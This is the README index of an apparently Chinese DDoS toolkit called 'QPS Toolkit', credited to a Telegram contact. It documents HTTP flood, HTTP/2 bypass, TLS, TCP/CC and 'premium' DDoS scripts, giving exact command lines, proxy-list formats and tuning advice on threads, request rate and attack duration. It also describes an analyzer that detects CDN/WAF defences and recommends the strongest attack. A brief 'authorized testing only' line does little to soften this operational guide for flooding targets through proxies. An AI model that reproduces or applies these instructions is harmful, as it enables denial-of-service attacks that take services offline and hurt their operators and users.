# Scripts 索引

所有攻击脚本的完整索引和使用说明。

**作者：** Telegram [@jobliyunlong](https://t.me/jobliyunlong)

---

## 📁 目录结构

```
scripts/
├── analyzer-tools/      # 协议分析工具
├── http-attacks/        # HTTP 攻击脚本
├── tcp-attacks/         # TCP 攻击脚本
├── tls-attacks/         # TLS 攻击脚本
└── premium-ddos/        # 高级 DDoS 工具
```

---

## 🧠 协议分析工具 (analyzer-tools/)

### protocol-analyzer
智能协议分析器，自动检测目标协议并推荐最佳攻击方案。

**使用方法:**
```bash
cd analyzer-tools
./protocol-analyzer https://target.com
```

**功能:**
- 自动检测 HTTP/1.0, HTTP/1.1, HTTP/2
- TLS 版本分析
- CDN/WAF 检测
- AI 智能评分
- 推荐最佳工具

[详细文档](./analyzer-tools/ANALYZER-GUIDE.txt)

---

## 🌐 HTTP 攻击脚本 (http-attacks/)

### 1. http2-bypass.js
HTTP/2 协议绕过攻击，适用于支持 HTTP/2 的目标。

```bash
node http2-bypass.js <URL> <时间> <速率> <线程> <代理文件>
```

**示例:**
```bash
node http2-bypass.js https://target.com 60 100 10 ../../config/proxies/global.txt
```

---

### 2. http-flood.js
HTTP 洪水攻击，大流量请求攻击，支持 JA3 指纹模拟。

```bash
node http-flood.js <URL> <时间> <代理文件> <线程> <速率> <模式> <查询>
```

**示例:**
```bash
node http-flood.js https://target.com 120 ../../config/proxies/global.txt 20 100 bypass false
```

---

### 3. http-methods.js
多种 HTTP 方法测试，支持 GET/POST/PUT/DELETE。

```bash
node http-methods.js <URL> <时间> <代理文件> <线程> <方法>
```

**示例:**
```bash
node http-methods.js https://target.com 60 ../../config/proxies/global.txt 10 GET
```

---

### 4. post-get-attack.js
POST/GET 混合攻击，支持自定义请求头和参数。

```bash
node post-get-attack.js <方法> <URL> <时间> <速率> <线程> <代理文件> --http <版本>
```

**示例:**
```bash
node post-get-attack.js POST https://target.com 60 100 10 ../../config/proxies/global.txt --http 2
```

---

### 5. distributed-attack.js
分布式攻击，多协议混合。

```bash
node distributed-attack.js <URL> <时间> <速率> <线程> <代理文件>
```

---

### 6. layer7-flooder.js
Layer 7 泛洪攻击。

```bash
node layer7-flooder.js <URL> <时间> <速率> <线程> <代理文件>
```

---

## 🔐 TLS 攻击脚本 (tls-attacks/)

### tls-attack.js ⚡ v2.0 已优化！
TLS 加密攻击，支持 TLS 1.2/1.3，已全面优化！

```bash
node tls-attack.js <URL> <时间> <速率> <线程> <代理文件>
```

**示例:**
```bash
node tls-attack.js https://target.com 90 32 8 ../../config/proxies/global.txt
```

**核心特性:**
- ✅ TLS 1.2/1.3 支持
- ✅ HTTP/2 over TLS
- ✅ **代理池验证算法**（500 并发，8秒验证4000+代理）
- ✅ **智能过滤无效代理**（自动提升成功率）
- ✅ 实时状态监控 + 美化进度条
- ✅ ES6+ 现代语法（性能提升20%）
- ✅ 彩色输出 + 详细统计

**v2.0 优化亮点:**
- 🔥 代理验证：自动验证（代理 > 100 时），实时显示进度
- 🔥 性能提升：IP生成速度 +20%，代码行数 -1.4%
- 🔥 代码质量：ES6+ 现代语法，可读性大幅提升
- 🔥 成功率提升：只使用可用代理，攻击更稳定

**推荐使用：** 
- `scripts/recommended/tls-attack.js` - 已优化版本（推荐）
- `scripts/tls-attacks/tls-attack.js` - 同步优化版本

---

## 🔌 TCP 攻击脚本 (tcp-attacks/)

### tcp (bash)
TCP 层攻击启动脚本。

```bash
./tcp <URL> <代理文件> <时间>
```

### cc-mod.js
CC 攻击模块，TCP 连接攻击。

```bash
node cc-mod.js <URL> <代理文件> <时间> <方法>
```

---

## ⚡ Premium DDoS 工具 (premium-ddos/)

### quantum-strike (推荐)
量子级打击系统，125 并发超核心引擎。

```bash
./quantum-strike <URL> <代理文件> <时间>
```

**示例:**
```bash
./quantum-strike https://target.com ../../config/proxies/global.txt 60
```

**特性:**
- 125 个并发进程
- 自动超核攻击
- 实时状态显示
- 智能代理轮换

### hyper-core.js
超核心攻击引擎（由 quantum-strike 调用）。

[详细文档](./premium-ddos/README.md)

---

## 📊 参数说明

### 通用参数
- `<URL>` - 目标地址 (https://target.com)
- `<时间>` - 攻击持续时间（秒）
- `<速率>` - 每秒请求数 (RPS)
- `<线程>` - 并发线程数
- `<代理文件>` - 代理列表文件路径

### 代理文件格式
```
IP:PORT
例如:
192.168.1.1:8080
10.0.0.1:3128
```

---

## 🎯 使用建议

### 1. 先使用协议分析器
```bash
cd analyzer-tools
./protocol-analyzer https://target.com
```
分析器会推荐最适合的工具。

### 2. 根据推荐选择工具
- **HTTP/1.1 最佳** → quantum-strike
- **HTTP/2 支持** → http2-bypass.js
- **TLS 加密** → tls-attack.js
- **通用攻击** → http-methods.js

### 3. 调整参数
- 线程数建议: 10-50
- 速率建议: 50-200 RPS
- 时间建议: 30-300 秒

---

## ⚠️  注意事项

1. **仅用于授权测试**
2. **准备有效的代理列表**
3. **遵守法律法规**
4. **监控系统资源**
5. **避免过高并发导致系统崩溃**

---

## 🆘 常见问题

**Q: 显示 0 请求怎么办？**
A: 检查代理是否有效，目标是否可达。

**Q: 如何选择最佳工具？**
A: 使用 protocol-analyzer 自动分析。

**Q: 内存占用过高？**
A: 降低线程数和速率。

**Q: 彩色输出不显示？**
A: 确保终端支持 ANSI 转义码。

---

**© 2025 QPS Toolkit**
